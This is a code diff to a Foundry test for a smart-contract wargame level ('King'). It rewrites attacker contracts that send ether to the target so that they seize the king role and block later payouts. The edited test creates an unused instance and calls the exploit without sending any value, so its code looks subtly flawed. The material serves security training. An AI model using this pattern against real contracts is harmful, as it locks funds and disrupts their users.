@@ -27,13 +27,25 @@ contract KingTest is LevelTest {
 
     function exploit() internal override {
         vm.startPrank(player);
-        KingExploit expl = new KingExploit(level);
-        expl.run{value: 1 wei}();
+
+        // KingExploit2 expl2 = new KingExploit2(level);
+        // expl2.run{value: 1 wei}();
+
+        KingExploit1 expl1 = new KingExploit1();
+        (new KingExploit1()).run(address(level));
+
         vm.stopPrank();
     }
 }
 
-contract KingExploit {
+contract KingExploit1 {
+    function run(address _king) public payable {
+        (bool success, ) = payable(_king).call{value: msg.value}("");
+        require(success, "failed to send ether");
+    }
+}
+
+contract KingExploit2 {
     address payable level;
 
     constructor(King _king) {
@@ -41,7 +53,7 @@ contract KingExploit {
     }
 
     function run() public payable {
-        (bool success,) = level.call{value: msg.value}("");
+        (bool success, ) = level.call{value: msg.value}("");
         require(success, "failed to send ether");
     }
 
